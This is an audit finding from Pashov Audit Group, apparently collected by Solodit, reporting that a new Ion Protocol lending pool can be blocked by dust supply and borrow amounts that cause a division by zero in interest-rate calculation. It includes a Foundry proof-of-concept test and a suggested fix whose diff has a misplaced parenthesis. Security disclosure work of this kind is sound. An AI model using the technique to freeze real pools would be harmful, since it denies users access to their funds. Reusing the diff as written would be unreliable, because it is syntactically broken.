---
# Core Classification
protocol: Ionprotocol
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 36438
audit_firm: Pashov Audit Group
contest_link: none
source_link: https://github.com/pashov/audits/blob/master/team/md/IonProtocol-security-review.md
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Pashov Audit Group
---

## Vulnerability Title

[M-04] New pool can be temporarily blocked

### Overview


The Ion pool, a new feature, can be attacked by supplying and borrowing a small amount of underlying. This causes a division by zero error and blocks all pool operations. To fix this, the `calculateInterestRate` function should be updated to check for a zero `distributionFactor`.

### Original Finding Content

**Severity**

**Impact:** High

**Likelihood:** Low

**Description**

The newly deployed Ion pool can be DoSed by supplying and borrowing a dust amount of underlying. When `accrueInterest` is called the Ion pool requests a `borrowRate` value from the `InterestRate` contract:

```solidity
        (uint256 borrowRate, uint256 reserveFactor) =
            $.interestRateModule.calculateInterestRate(ilkIndex, totalDebt, totalEthSupply);
```

In the `calculateInterestRate` function, if the `distributionFactor` is non-zero and the ETH supply is relatively small, a division by zero can occur:

```solidity
    function calculateInterestRate(
        uint256 ilkIndex,
        uint256 totalIlkDebt,
        uint256 totalEthSupply
    )
        external
        view
        returns (uint256, uint256)
    {
        ---SNIP---
        if (distributionFactor == 0) {
            return (ilkData.minimumKinkRate, ilkData.reserveFactor.scaleUpToRay(4));
        }
        // [RAD] / [WAD] = [RAY]
        uint256 utilizationRate =
>>          totalEthSupply == 0 ? 0 : totalIlkDebt / (totalEthSupply.wadMulDown(distributionFactor.scaleUpToWad(4)));
```

This issue results in all pool operations being blocked, as `accrueInterest` is called in all of them. The only way to return the pool to a normal state is to swap the interest rate module to one with a zero `distributionFactor`.

Coded POC for `IonPool.t.sol` where the attacker blocks the pool in two separate transactions. (lender's `supply` call was removed from `setUp`):

```solidity
    function test_DoS() public {
        uint256 collateralDepositAmount = 10e18;
        uint256 normalizedBorrowAmount = 1;

        vm.startPrank(lender1);
        underlying.approve(address(ionPool), type(uint256).max);
        ionPool.supply(lender1, 2, new bytes32[](0));
        vm.stopPrank();

        vm.startPrank(borrower1);
        ionPool.depositCollateral(0, borrower1, borrower1, collateralDepositAmount, new bytes32[](0));
        ionPool.borrow(0, borrower1, borrower1, normalizedBorrowAmount, new bytes32[](0));

        vm.warp(block.timestamp + 1);
        vm.expectRevert();
        ionPool.accrueInterest();
    }
```

**Recommendations**

Consider updating the check in `calculateInterestRate`

```diff
+       if (distributionFactor == 0 || totalEthSupply.wadMulDown(distributionFactor.scaleUpToWad(4) == 0) {
            return (ilkData.minimumKinkRate, ilkData.reserveFactor.scaleUpToRay(4));
        }
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Pashov Audit Group |
| Protocol | Ionprotocol |
| Report Date | N/A |
| Finders | Pashov Audit Group |

### Source Links

- **Source**: https://github.com/pashov/audits/blob/master/team/md/IonProtocol-security-review.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

